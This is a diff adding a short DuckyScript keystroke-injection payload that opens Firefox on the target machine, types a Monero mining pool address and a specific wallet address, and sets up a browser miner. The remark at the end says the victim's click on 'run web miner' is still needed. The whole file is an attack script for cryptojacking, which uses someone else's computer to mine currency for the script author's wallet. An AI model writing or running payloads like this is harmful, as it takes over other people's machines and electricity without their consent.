@@ -1,0 +1,15 @@
+REM This script opens a browser and sets up a Monero miner
+DELAY 200
+GUI
+DELAY 50
+SPACE
+DELAY 10
+STRING firefox
+DELAY 20
+ENTER
+DELAY 5000
+STRING moneroocean.stream
+DELAY 500
+STRING 46PwDYLvdCG2eWetfaxbUoGCLdyKrMh3j8j5QVHrR5zTiLEPmSgQnzoaVc2D7qC3wMBmoEegBr4W9Y9N7SzqrfAs6HLV8r5
+
+REM in this case, the user has to click the button "run web miner" since Tab will not select it
